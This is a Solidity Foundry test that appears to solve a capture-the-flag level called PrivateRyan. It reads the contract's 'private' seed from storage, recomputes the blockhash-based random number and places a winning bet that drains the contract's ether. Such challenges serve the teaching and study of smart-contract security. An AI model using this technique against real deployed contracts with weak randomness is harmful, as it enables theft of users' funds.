// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/02_PrivateRyan/PrivateRyan.sol";

// forge test --match-contract PrivateRyanTest -vvvv
contract PrivateRyanTest is BaseTest {
    PrivateRyan instance;

    function setUp() public override {
        super.setUp();
        instance = new PrivateRyan{value: 0.01 ether}();
        vm.roll(48743985);
    }

    function testExploitLevel() public {
        uint256 seed = uint256(vm.load(address(instance), bytes32(uint256(0))));
        uint256 bet = getBet(100, seed);
        instance.spin{value: 0.01 ether}(bet);

        checkSuccess();
    }

    function getBet(
        uint256 max,
        uint256 seed
    ) internal view returns (uint256 result) {
        uint256 FACTOR = 1157920892373161954235709850086879078532699846656405640394575840079131296399;

        uint256 factor = (FACTOR * 100) / max;
        uint256 lastBlockNumber = block.number - seed;
        uint256 hashVal = uint256(blockhash(lastBlockNumber));

        return uint256((uint256(hashVal) / factor)) % max;
    }

    function checkSuccess() internal view override {
        assertTrue(
            address(instance).balance == 0,
            "Solution is not solving the level"
        );
    }
}
